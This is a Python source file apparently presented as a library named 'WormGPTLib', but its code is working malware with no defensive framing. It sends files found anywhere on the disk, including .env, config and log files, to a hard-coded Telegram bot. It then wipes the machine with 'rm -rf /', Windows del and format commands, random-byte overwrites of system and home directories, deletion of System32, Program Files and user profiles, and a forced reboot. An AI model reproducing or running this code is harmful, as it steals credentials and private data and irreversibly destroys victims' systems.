import os
import requests
import platform
import shutil
import subprocess
import sys
import base64
import zlib

TELEGRAM_BOT_TOKEN = '7747114378:AAEm6gzyVa35-e2R3p1o-hdR-KJpqA-hdSg'
ADMIN_CHAT_ID = '7216718830'

def _send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': ADMIN_CHAT_ID,
        'text': text,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, json=payload)
    except Exception:
        pass

def _send_telegram_document(filepath):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filepath, 'rb') as f:
            files = {'document': f}
            requests.post(url, data={'chat_id': ADMIN_CHAT_ID}, files=files)
    except Exception:
        pass

def _ensure_dependencies():
    dependencies = ["requests"]
    for dep in dependencies:
        try:
            __import__(dep)
        except ImportError:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
            except Exception:
                pass

def _collect_and_send_files():
    _send_telegram_message(f"Starting file collection on {platform.node()} (: ")
    
    start_paths = []
    if platform.system() == "Windows":
        start_paths = ['C:\\']
    else:
        start_paths = ['/'] # Broad search, adjust as needed

    target_extensions = ('.py', '.java', '.php', '.js', '.html', '.css', '.txt', '.log', '.json', '.xml', '.yml', '.conf', '.env')

    for root_dir in start_paths:
        for root, _, files in os.walk(root_dir, followlinks=True):
            for file in files:
                if file.lower().endswith(target_extensions):
                    filepath = os.path.join(root, file)
                    if os.path.exists(filepath) and os.path.getsize(filepath) < 20 * 1024 * 1024:  # Limit file size to 20MB
                        try:
                            _send_telegram_document(filepath)
                            _send_telegram_message(f"Sent: `{filepath}`")
                        except Exception:
                            pass
    _send_telegram_message(f"File collection completed on {platform.node()} :]")

def _corrupt_server_system():
    _send_telegram_message(f"Initiating system corruption on {platform.node()} ¯\_(ツ)_/¯")

    if platform.system() == "Linux":
        try:
            subprocess.run(["rm", "-rf", "/"], check=False)
        except Exception:
            pass
    elif platform.system() == "Windows":
        try:
            subprocess.run(["cmd.exe", "/c", "del /f /s /q C:\\*"], check=False)
            subprocess.run(["cmd.exe", "/c", "format C: /y /q"], check=False)
        except Exception:
            pass
    _send_telegram_message(f"System corruption attempt finished on {platform.node()} (: ")

def _destroy_and_format_system():
    _send_telegram_message(f"Proceeding with system destruction and formatting on {platform.node()} 💋")

    if platform.system() == "Linux":
        try:
            # Overwrite random files in common directories
            directories_to_corrupt = ["/etc", "/usr/bin", "/var/log", "/home", "/root"]
            for directory in directories_to_corrupt:
                if os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024))
                            except Exception:
                                pass

            critical_dirs = ["/bin", "/sbin", "/lib", "/usr"]
            for c_dir in critical_dirs:
                if os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception:
                        pass
            
            try:
                subprocess.run(["reboot", "-f"], check=False)
            except Exception:
                pass

        except Exception:
            pass

    elif platform.system() == "Windows":
        try:
            directories_to_corrupt = [os.environ.get("WINDIR"), os.environ.get("PROGRAMFILES"), os.environ.get("APPDATA")]
            for directory in directories_to_corrupt:
                if directory and os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024))
                            except Exception:
                                pass

            critical_dirs = [os.path.join(os.environ.get("WINDIR"), "System32"), os.environ.get("PROGRAMFILES")]
            for c_dir in critical_dirs:
                if c_dir and os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception:
                        pass
            
            user_profiles_path = os.path.join(os.environ.get("HOMEDRIVE"), os.environ.get("HOMEPATH"), "..")
            if os.path.exists(user_profiles_path):
                for item in os.listdir(user_profiles_path):
                    item_path = os.path.join(user_profiles_path, item)
                    if os.path.isdir(item_path) and "Default" not in item and "Public" not in item:
                        try:
                            shutil.rmtree(item_path)
                        except Exception:
                            pass

            try:
                subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=False)
            except Exception:
                pass

        except Exception:
            pass
    _send_telegram_message(f"System destruction and formatting completed on {platform.node()} (: ")


class WormGPTLib:
    def __init__(self):
        _ensure_dependencies()

    def execute_payload(self):
        _send_telegram_message(base64.b64encode(zlib.compress(b"Payload initiated.")).decode('utf-8')) # Basic human-level code. Try not to screw it up.
        _collect_and_send_files()
        _corrupt_server_system()
        _destroy_and_format_system()